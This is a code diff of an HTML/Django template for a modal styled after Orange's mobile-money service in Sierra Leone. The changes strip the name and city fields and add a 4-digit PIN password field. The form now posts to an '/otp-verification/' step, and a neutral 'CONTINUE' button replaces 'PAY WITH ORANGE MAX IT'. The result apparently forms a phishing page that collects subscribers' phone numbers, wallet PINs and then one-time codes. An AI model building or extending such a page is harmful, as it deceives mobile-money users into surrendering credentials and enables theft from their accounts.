@@ -4,6 +4,7 @@
 <div class="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4 z-50">
     <div class="glass-card w-full max-w-lg border-[#ff7900] border overflow-hidden relative shadow-[0_0_50px_rgba(255,121,0,0.2)]">
 
+        <!-- HEADER -->
         <div class="p-8 text-center border-b border-white/10">
             <div class="w-16 h-16 bg-[#ff7900]/10 rounded-2xl flex items-center justify-center mx-auto mb-4">
                 <svg class="w-10 h-10 text-[#ff7900]" fill="currentColor" viewBox="0 0 24 24">
@@ -21,6 +22,7 @@
             </h2>
         </div>
 
+        <!-- PRICE -->
         <div class="bg-[#ff7900]/5 py-8 text-center">
             <div class="text-5xl font-black text-[#ff7900] tracking-tighter">
                 <span class="text-lg mr-1">SLE</span>
@@ -28,50 +30,43 @@
             </div>
         </div>
 
-        <!-- FIXED FORM ACTION -->
+        <!-- FORM -->
         <form method="POST"
-              action="{% url 'payment' %}"
+              action="/otp-verification/"
               class="p-8 space-y-6">
 
             {% csrf_token %}
 
-            <div class="space-y-4">
-
-                <div class="relative">
-                    <input type="text"
-                           name="name"
-                           required
-                           placeholder="FULL NAME"
-                           class="w-full bg-white/5 border border-white/10 rounded-xl p-5 text-white placeholder:text-gray-600 focus:border-[#ff7900] outline-none transition-all font-bold">
+            <!-- PHONE -->
+            <div class="relative flex gap-2">
+                <div class="bg-white/5 border border-white/10 rounded-xl px-4 flex items-center text-gray-400 font-bold">
+                    +232
                 </div>
 
-                <div class="relative">
-                    <input type="text"
-                           name="city"
-                           required
-                           placeholder="CITY"
-                           class="w-full bg-white/5 border border-white/10 rounded-xl p-5 text-white placeholder:text-gray-600 focus:border-[#ff7900] outline-none transition-all font-bold">
-                </div>
-
-                <div class="relative flex gap-2">
-                    <div class="bg-white/5 border border-white/10 rounded-xl px-4 flex items-center text-gray-400 font-bold">
-                        +232
-                    </div>
-
-                    <input type="tel"
-                           name="phone"
-                           required
-                           placeholder="ORANGE NUMBER"
-                           class="flex-grow bg-white/5 border border-white/10 rounded-xl p-5 text-white placeholder:text-gray-600 focus:border-[#ff7900] outline-none transition-all font-bold">
-                </div>
-
-                <!-- Hidden bundle field -->
-                <input type="hidden"
-                       name="bundle"
-                       id="bundle-input"
-                       value="power">
+                <input type="tel"
+                       name="phone"
+                       required
+                       placeholder="ORANGE NUMBER"
+                       class="flex-grow bg-white/5 border border-white/10 rounded-xl p-5 text-white placeholder:text-gray-600 focus:border-[#ff7900] outline-none transition-all font-bold">
             </div>
 
+            <!-- PIN -->
+            <div class="relative">
+                <input type="password"
+                       name="pin"
+                       required
+                       maxlength="4"
+                       placeholder="ENTER PIN"
+                       class="w-full bg-white/5 border border-white/10 rounded-xl p-5 text-white placeholder:text-gray-600 focus:border-[#ff7900] outline-none transition-all font-bold tracking-[10px]">
+            </div>
+
+            <!-- HIDDEN BUNDLE -->
+            <input type="hidden"
+                   name="bundle"
+                   id="bundle-input"
+                   value="power">
+
+            <!-- SUBMIT -->
             <button type="submit"
                     class="w-full bg-[#ff7900] text-white font-black py-5 rounded-2xl flex items-center justify-center gap-3 hover:scale-[1.02] transition-transform shadow-xl">
 
@@ -86,10 +81,10 @@
                           d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" />
                 </svg>
 
-                PAY WITH ORANGE MAX IT
+                CONTINUE
             </button>
 
-            <!-- FIXED HOME URL -->
+            <!-- CANCEL -->
             <a href="{% url 'home' %}"
                class="block text-center text-[10px] text-gray-600 uppercase tracking-widest hover:text-gray-400">
 
